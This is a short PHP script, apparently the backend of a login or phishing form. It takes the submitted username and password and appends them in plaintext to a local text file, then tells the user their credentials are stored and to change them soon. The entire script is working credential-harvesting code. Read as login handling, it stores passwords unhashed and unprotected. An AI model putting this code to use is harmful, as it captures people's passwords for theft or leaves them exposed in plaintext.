<?php
$username = $_POST['username'];
$password = $_POST['password'];

$file = fopen("data.txt", "a") or die("some error occurred"); // open file, create if doesn't exist
$txt = "$username $password\n"; // store data as username password
fwrite($file, $txt); // write to our file
fclose($file); // close the file handle

echo 'Your username and password are stored in our database. Change it soon!';
